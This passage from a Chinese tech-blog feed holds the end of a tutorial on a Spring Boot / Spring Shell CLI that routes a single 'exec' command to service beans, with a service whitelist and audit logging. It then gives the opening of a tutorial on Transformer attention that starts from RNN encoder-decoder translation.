        String[] args = request.getArgs().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]);

        <span class="hljs-comment">// 动态获取 Service Bean</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">serviceBean</span> <span class="hljs-operator">=</span> applicationContext.getBean(serviceName);

        <span class="hljs-comment">// 执行命令</span>
        <span class="hljs-keyword">if</span> (serviceBean <span class="hljs-keyword">instanceof</span> CommandHandler handler) {
            <span class="hljs-keyword">return</span> handler.handle(args);
        }

        <span class="hljs-keyword">return</span> <span class="hljs-string">"服务未找到"</span>;
    }
}
</code></pre>
<h4 data-id="heading-5">4. 统一接口规范</h4>
<p>所有需要通过CLI调用的服务都必须实现 <code>CommandHandler</code> 接口：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CommandHandler</span> {
    String <span class="hljs-title function_">handle</span><span class="hljs-params">(String[] args)</span>;
    <span class="hljs-keyword">default</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"命令描述"</span>; }
    <span class="hljs-keyword">default</span> String <span class="hljs-title function_">getUsage</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"使用说明"</span>; }
}
</code></pre>
<p>示例服务实现：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("userService")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CommandHandler</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handle</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-keyword">if</span> (args.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> getUsage();

        <span class="hljs-keyword">switch</span> (args[<span class="hljs-number">0</span>]) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">"list"</span>:
                <span class="hljs-keyword">return</span> listUsers(args.length &gt; <span class="hljs-number">1</span> ? args[<span class="hljs-number">1</span>] : <span class="hljs-literal">null</span>);
            <span class="hljs-keyword">case</span> <span class="hljs-string">"get"</span>:
                <span class="hljs-keyword">return</span> getUser(args[<span class="hljs-number">1</span>]);
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"未知命令: "</span> + args[<span class="hljs-number">0</span>];
        }
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">listUsers</span><span class="hljs-params">(String type)</span> {
        <span class="hljs-comment">// 实现获取用户列表逻辑</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"用户列表..."</span>;
    }
}
</code></pre>
<h2 data-id="heading-6">三、方案优势</h2>
<h4 data-id="heading-7"><strong>1. 客户端统一命令</strong></h4>
<ul>
<li>Shell 只需维护一条 <code>exec</code> 命令</li>
<li>新增服务无需修改客户端代码</li>
</ul>
<h4 data-id="heading-8"><strong>2. 服务端动态分发</strong></h4>
<ul>
<li>新增接口无需修改 CLI</li>
<li>统一接口入口便于权限控制与日志审计</li>
</ul>
<h4 data-id="heading-9"><strong>3. 易扩展</strong></h4>
<ul>
<li>支持任意参数数量、类型</li>
<li>可结合 OpenAPI 自动生成命令提示与帮助信息</li>
</ul>
<h4 data-id="heading-10"><strong>4. 逻辑解耦</strong></h4>
<ul>
<li>CLI 仅做命令解析和 HTTP 调用</li>
<li>业务逻辑完全在服务端</li>
</ul>
<h2 data-id="heading-11">四、安全控制</h2>
<h4 data-id="heading-12">1. 服务白名单</h4>
<p>通过配置文件限制可访问的服务：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">cli:</span>
  <span class="hljs-attr">allowed-services:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">userService</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">roleService</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">systemService</span>
</code></pre>
<h4 data-id="heading-13">2. 参数验证</h4>
<p>使用 Spring Validation 进行请求参数校验，防止恶意输入。</p>
<h4 data-id="heading-14">3. 访问日志</h4>
<p>记录所有CLI调用，便于审计和问题追踪：</p>
<pre><code class="hljs language-java" lang="java">logger.info(<span class="hljs-string">"CLI请求 - 服务: {}, 参数: {}, 来源: {}"</span>,
    serviceName, Arrays.toString(args), httpRequest.getRemoteAddr());
</code></pre>
<h2 data-id="heading-15">五、实际应用场景</h2>
<h4 data-id="heading-16">1. 运维场景</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">查看系统状态</span>
exec systemService --args status
<span class="hljs-meta prompt_">
# </span><span class="bash">重启服务</span>
exec serviceManager --args restart userService
<span class="hljs-meta prompt_">
# </span><span class="bash">查看日志</span>
exec logService --args tail 100 error
</code></pre>
<h4 data-id="heading-17">2. 调试场景</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">查看用户详情</span>
exec userService --args get 123
<span class="hljs-meta prompt_">
# </span><span class="bash">测试接口</span>
exec testService --args simulate /api/orders
<span class="hljs-meta prompt_">
# </span><span class="bash">清理缓存</span>
exec cacheService --args clear all
</code></pre>
<h4 data-id="heading-18">3. 批量操作</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">批量导入用户</span>
exec userService --args import users.csv
<span class="hljs-meta prompt_">
# </span><span class="bash">批量更新角色</span>
exec roleService --args batchUpdate role-mapping.json
</code></pre>
<h2 data-id="heading-19">六、扩展功能</h2>
<h4 data-id="heading-20">1. 交互增强</h4>
<ul>
<li>Tab 补全：自动补全服务名和参数</li>
<li>命令历史：保存执行历史，支持上下键浏览</li>
<li>颜色输出：不同类型信息使用不同颜色显示</li>
</ul>
<h4 data-id="heading-21">2. 结果格式化</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">formatResponse</span><span class="hljs-params">(String data)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> objectMapper.readValue(data, Object.class);
        <span class="hljs-keyword">return</span> objectMapper.writerWithDefaultPrettyPrinter()
                          .writeValueAsString(json);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">return</span> data;
    }
}
</code></pre>
<h4 data-id="heading-22">3. 脚本模式</h4>
<p>支持从文件执行命令序列：</p>
<pre><code class="hljs language-shell" lang="shell">exec script --args commands.txt
</code></pre>
<h2 data-id="heading-23">七、总结</h2>
<p>本文介绍的"通用命令+动态分发"方案，通过Spring Boot + Spring Shell构建，使用单一 exec 命令实现多服务动态调用，大幅简化了CLI系统的维护复杂度。</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/yuboon</span><span class="hljs-regexp">/java-examples/tree</span><span class="hljs-regexp">/master/springboot</span>-cli
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[解剖注意力：从零构建Transformer的终极指南]]></title>    <link>https://juejin.cn/post/7584013833993224226</link>    <guid>https://juejin.cn/post/7584013833993224226</guid>    <pubDate>2025-12-16T06:11:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584013833993224226" data-draft-id="7583992239103049780" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="解剖注意力：从零构建Transformer的终极指南"/> <meta itemprop="keywords" content="深度学习"/> <meta itemprop="datePublished" content="2025-12-16T06:11:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Narrastory"/> <meta itemprop="url" content="https://juejin.cn/user/4355593566170010"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            解剖注意力：从零构建Transformer的终极指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4355593566170010/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Narrastory
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:11:58.000Z" title="Tue Dec 16 2025 06:11:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><h2 data-id="heading-0">解剖注意力：从零构建Transformer的终极指南</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c68de8a68e4147d0ba2f162dc642c0bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=Smr%2FNYE8Wy6F%2FIaIO6toHKd9pSM%3D" alt="GitHub" loading="lazy"/></p>
<blockquote>
<p>Author: Ming</p>
</blockquote>
<hr/>
<div align="center">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37acc0c1e2bb4a518eccc6055f96eaa6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=lqcla3Fz3E0t6OwlOuXzNqSzx8g%3D" alt="AI Generated Art" width="90%" loading="lazy"/>
</div>
<p>相信不用我过多介绍，你已经对 Transformer 如雷贯耳，它是当今大语言模型的核心基石，可以说没有Transformer就没有今天的人工智能浪潮。</p>
<p>给还不了解Transformer的读者简单介绍一下，Transformer是一种深度学习<strong>架构</strong>（完全不同于以往的循环神经网络），最初于2017年由Google团队在论文《Attention Is All You Need》中提出，一开始它被提出来是为了解决机器翻译问题，并一举取得突破，在翻译任务中取得的非常大的成功。然而，人们很快发现，Transformer 的潜力远超预期——它不仅擅长翻译，在序列和语言任务中游刃有余，还能轻松迁移到其他任务中，甚至形成“碾压”级别的优势。</p>
<p>因此，在这篇文章中，我们将深入 Transformer 的每一层结构，从理论到代码，从矩阵乘法开始，一步步拆解它的设计精髓。我们不仅会探讨它的组成与原理，还会教你如何亲手从零实现一个完整的 Transformer 模型。</p>
<p>相信我，当你在看完了本篇文章后，你完全可以自己“手搓”一个Transformer出来，更能理解其设计哲学，并灵活运用到你自己的实际项目中。当然，由于 Transformer 属于相对前沿且有一定深度的内容，为了更顺畅地阅读与实践，建议你具备以下基础：机器学习与深度学习的基本概念、线性代数基础知识，基本自然语言处理</p>
<p><em>本文中展示的神经网络架构图，除特殊注明外，均为作者原创绘制。读者可自由分享使用，但使用时请注明出处。</em></p>
<hr/>
<p>既然要深入理解Transformer，我们不妨先回到它诞生的起点：机器翻译问题。在Transformer尚未出现的年代，机器翻译的主流架构是什么？熟悉深度学习历史的读者一定会想到——基于循环神经网络（RNN）的Seq2Seq模型，也就是经典的编码器-解码器架构。让我们以英译中任务为例，一步步还原它的工作流程。</p>
<p>假设我们要翻译“How are you”这句话。首先，输入的英文单词经过Embedding层转化为词向量序列。这些向量按时间顺序依次输入循环神经网络（RNN）中，经过层层传递与更新，最终在最后一个时间步输出一个隐藏状态（hidden state）。这个状态被视为整个句子的语义浓缩，承载着“How are you”的全部信息。这个过程，就是<strong>编码器（Encoder）</strong> 的核心。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12ef7a3c3748475ba7477c9d5413b6dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=Rcd3%2BkWdSkV2Ufx5khyTwf8ptwM%3D" alt="c1.jpg" width="100%" loading="lazy"/></p>
<p>需要注意的是，上图中简化为一个 <code>RNN Cell</code> 的模块，在实际任务中通常是多层、多单元的复杂结构——可以是LSTM，也可以是GRU。像机器翻译这样复杂度高、序列长的任务，单一RNN单元难以胜任，实际使用的是多层堆叠的RNN网络。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c01697f3d5114412abc4c655ea0fca38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=eEnd26nhfJhw3k6uOOdjS7usX0M%3D" alt="c3.jpg" width="100%" loading="lazy"/></p>
<p>得到这个全局隐藏状态后，<strong>解码器（Decoder）</strong> 开始工作，将其逐步转化为目标语言（中文）。如上图所示，解码器在每个时间步不仅接收上一个时间步的输出，还会将编码器输出的隐藏状态与当前输入进行合并（图中圆圈内一竖表示拼接操作，类似PyTorch中的 <code>torch.cat()</code> 或 NumPy 中的 <code>np.concatenate()</code>）。</p>
<p>这种设计在当年被视为一种重要改进——它让解码过程始终“携带”源句子的整体信息，理论上可以在生成长序列时缓解信息衰减问题。尤其在长句子翻译中，这样做有助于模型记住开头的语境，避免翻译到句末时遗忘开头的内容。</p>
<p>下图是此网络架构的训练流程，具体的细节就不过多介绍了。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb2a1170b4e54d06a7f45c544a3f6ee6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=F75j9cbeqZRGcTczvl0vgTSgNrQ%3D" alt="c2.jpg" width="100%" loading="lazy"/></p>
<p>看到这里，你可能会想，真的有必要把隐藏状态和当前输入做拼接吗？例如在生成“你好”时，我们强行注入了“How are you”的全部语义。这虽然带来了全局信息，却也不可避免地引入了<strong>噪声与冗余</strong>——毕竟在翻译当前词时，我们可能并不需要整个句子的所有信息，而只是其中某几个相关的片段。</p>
<p>如果你也产生了这样的疑问，那么恭喜，你已经触及了<strong>注意力机制</strong>诞生的关键动机。没错，注意力并不是 Transformer 的专利，早在Transformer出现之前，它就已经在 seq2seq 模型中用于缓解上述问题了。它的核心思想很直观：<strong>让模型学会在解码每个词时，自主选择编码器输出的哪些部分更值得关注</strong>。</p>
<p>那么具体是如何实现的呢？下面就是一种结合了<strong>双向 RNN 与简易注意力</strong>的编码器-解码器架构：</p>
